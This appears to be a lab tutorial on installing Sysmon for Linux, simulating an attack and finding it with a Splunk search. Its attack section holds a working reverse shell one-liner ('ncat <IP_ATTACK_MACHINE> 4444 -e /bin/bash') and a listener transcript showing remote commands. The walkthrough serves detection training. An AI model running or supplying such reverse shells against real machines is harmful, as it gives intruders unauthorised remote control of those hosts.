# Monitoring and Investigation of Suspicious Process Execution

- Installation of **Sysmon for Linux** with an advanced XML configuration to detect multiple MITRE ATT&CK techniques.

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

## Installing Sysmon for Linux

```sh
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

sudo apt-get update
sudo apt-get install sysmonforlinux
```

## Advanced XML Configuration

#### Create a configuration file

```sh
nano sysmon-config.xml
```

#### Paste the following XML content (clean, indented, and optimized excerpt):

- [Recommended base config: MSTIC Sysmon Config](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)

#### Start Sysmon with the configuration

```sh
sysmon -i sysmon-config.xml
```

#### Verify Sysmon is running

```sh
sudo systemctl restart sysmon
sudo systemctl status sysmon
```

## Simulate an Attack – Reverse Shell with ncat

#### On the attack machine:

```sh
root@attack:~# apt install ncat net-tools -y
root@attack:~# ncat -lnvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.129.166.
Ncat: Connection from 192.168.129.166:33790.
ls
packages-microsoft-prod.deb
snap
splunkforwarder-9.4.3-237ebbd22314-linux-amd64.deb
sysmon-config.xml
pwd
/root
```

#### On the compromised (victim) machine:

```sh
apt install ncat net-tools -y
ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
```

#### Verify the connection:

```sh
lsof -i :4444
netstat -tulnp | grep 4444
```

## Analysis in Splunk (Search & Reporting)

#### Search queries in `Search & Reporting`:

- Show all logs related to Sysmon

- Filter on events identified as Command techniques

- Specific search for usage of ncat

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command ncat
```

![Enterprise](/Splunk_Ubuntu/assets/splunk_linux_11.png)
